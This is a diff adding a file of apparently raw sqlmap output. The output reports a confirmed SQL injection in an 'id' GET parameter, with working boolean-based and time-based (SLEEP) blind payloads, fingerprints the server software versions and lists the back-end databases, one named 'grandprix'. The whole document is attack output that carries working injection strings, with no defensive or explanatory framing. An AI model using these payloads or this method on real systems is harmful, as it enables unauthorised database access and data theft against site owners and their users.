@@ -1,0 +1,18 @@
+sqlmap identified the following injection point(s) with a total of 281 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1009) AND 2831=2831 AND (8400=8400&lang=gb&amp;rct=j&q=&esrc=s
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=1009) OR SLEEP(5) AND (6273=6273&lang=gb&amp;rct=j&q=&esrc=s
+---
+web server operating system: Linux CentOS 5.10
+web application technology: PHP 5.3.3, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] grandprix
+[*] information_schema
+
